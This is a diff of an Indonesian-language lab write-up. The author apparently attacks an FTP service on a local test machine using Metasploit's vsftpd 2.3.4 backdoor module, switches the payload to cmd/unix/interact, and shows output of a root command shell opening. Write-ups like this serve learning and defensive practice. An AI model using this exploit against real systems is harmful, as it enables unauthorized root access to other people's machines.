@@ -40,8 +40,6 @@ Saya mensimulasikan serangan *backdoor* pada layanan FTP yang berjalan di target
 3. **Troubleshooting:** Awalnya eksploitasi gagal membuat sesi (`no session was created`). Saya berhasil mengatasinya dengan mengganti payload secara manual ke `cmd/unix/interact`.
    <img width="1680" height="1050" alt="Screenshot 2026-04-03 at 10 32 17" src="https://github.com/user-attachments/assets/d43014ba-282a-4ac1-9a20-18b6ac742bd8" />
 
-
-
 ### Result:
 ```bash
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
@@ -49,6 +47,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [+] 192.168.64.2:21 - UID: uid=0(root) gid=0(root)
 [*] Found shell.
 [*] Command shell session 1 opened
+```
 <img width="1680" height="1050" alt="Screenshot 2026-04-03 at 10 35 49" src="https://github.com/user-attachments/assets/a5d5835a-be59-4cbb-9cd5-eefc87066514" />
 
 ## 🔧 Troubleshooting Log
